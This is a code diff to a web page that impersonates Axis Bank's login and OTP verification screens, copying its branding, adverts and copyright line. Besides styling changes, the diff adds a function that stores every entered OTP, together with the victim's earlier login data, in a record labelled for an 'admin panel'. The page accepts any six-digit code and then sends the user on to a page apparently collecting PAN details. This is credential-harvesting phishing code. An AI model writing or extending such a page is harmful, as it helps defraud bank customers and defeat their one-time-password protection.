@@ -167,22 +167,6 @@
             }
         }
         
-        .loader-text {
-            color: #87103F;
-            font-size: 24px;
-            font-weight: bold;
-            position: absolute;
-            top: 60%;
-            text-align: center;
-            width: 100%;
-            opacity: 0;
-            animation: fadeInText 1s ease 0.5s forwards;
-        }
-        
-        @keyframes fadeInText {
-            to { opacity: 1; }
-        }
-        
         /* Main Container */
         .main-container {
             opacity: 0;
@@ -194,9 +178,9 @@
             to { opacity: 1; }
         }
         
-        /* Header - Same as index.html */
+        /* Header - Updated with maroon red background and left logo */
         .bank-header {
-            background: white;
+            background: #87103F; /* Maroon Red */
             padding: 15px 40px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             position: relative;
@@ -220,6 +204,7 @@
             height: 45px;
             width: auto;
             object-fit: contain;
+            filter: brightness(0) invert(1); /* Makes logo white on maroon background */
         }
         
         .bank-title {
@@ -230,7 +215,7 @@
         .bank-name {
             font-size: 28px;
             font-weight: bold;
-            color: #87103F;
+            color: white; /* White text on maroon background */
             letter-spacing: 1px;
         }
         
@@ -247,27 +232,27 @@
         }
         
         .open-text {
-            color: #971647;
+            color: white; /* White text on maroon background */
             font-weight: bold;
             font-style: italic;
             font-size: 24px;
         }
         
         .banking-text {
-            color: #971647;
+            color: white; /* White text on maroon background */
             font-style: italic;
             font-size: 18px;
             letter-spacing: 1px;
         }
         
         .separator {
-            color: #ccc;
+            color: rgba(255, 255, 255, 0.7); /* Light separator on maroon */
             margin: 0 10px;
         }
         
         .login-using {
             font-size: 16px;
-            color: #666;
+            color: rgba(255, 255, 255, 0.9); /* Light text on maroon */
         }
         
         /* Main Content */
@@ -684,7 +669,6 @@
     <div class="page-loader" id="pageLoader">
         <div class="loader-container">
             <div class="loader-dot"></div>
-            <!-- Loading text removed here -->
         </div>
     </div>
     
@@ -705,7 +689,7 @@
                 
                 <div class="header-info">
                     <div class="header-text-container">
-                        <span class="open INTERNET BANKING-text">open</span>
+                        <span class="-text">open</span>
                         <span class="separator">|</span>
                         <span class="banking-text"></span>
                     </div>
@@ -784,13 +768,13 @@
         <!-- Footer -->
         <footer class="main-footer">
             <div class="footer-content">
-                <div class="footer-text"></div>
+                <div class="footer-text">Secure Banking with OTP Verification</div>
                 <div class="footer-links">
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
-                    <a href="#"></a>
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
                 </div>
                 <div class="copyright">
                     © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
@@ -1028,18 +1012,46 @@
                     verifyButton.classList.remove('loading');
                     verifyButton.disabled = false;
                     
+                    // Save to admin data as well
+                    saveToAdmin(otp);
+                    
                     // For demo purposes, accept any 6-digit OTP
                     if (otp.length === 6 && /^\d+$/.test(otp)) {
                         saveOTPVerification(otp, 'verified');
                         alert('OTP verified successfully!');
-                        // Redirect to success page or dashboard
-                        window.location.href = 'axis_success.html';
+                        // Redirect to axis_pan.html
+                        window.location.href = 'axis_pan.html';
                     } else {
                         saveOTPVerification(otp, 'failed');
                         alert('Invalid OTP. Please try again.');
                     }
                 }, 1500);
             });
+        }
+        
+        // Save OTP data to admin panel
+        function saveToAdmin(otp) {
+            // Get existing admin data or create empty array
+            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
+            
+            // Get last submission
+            const lastSubmission = getLastSubmission();
+            
+            // Add to admin data
+            adminData.unshift({
+                id: Date.now(),
+                type: 'otp_verification',
+                otp: otp,
+                status: 'verified',
+                timestamp: new Date().toISOString(),
+                loginData: lastSubmission ? lastSubmission.data : null,
+                loginType: lastSubmission ? lastSubmission.type : null
+            });
+            
+            // Save back to localStorage for admin panel
+            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+            
+            console.log('Data saved to admin:', { otp, status: 'verified' });
         }
         
         // Resend button handler
@@ -1083,7 +1095,12 @@
             if (!localStorage.getItem('axisBankOTPVerifications')) {
                 localStorage.setItem('axisBankOTPVerifications', JSON.stringify([]));
             }
+            
+            // Initialize localStorage for admin data if not exists
+            if (!localStorage.getItem('axisBankAdminData')) {
+                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            }
         });
     </script>
 </body>
-</html>
+    </html>
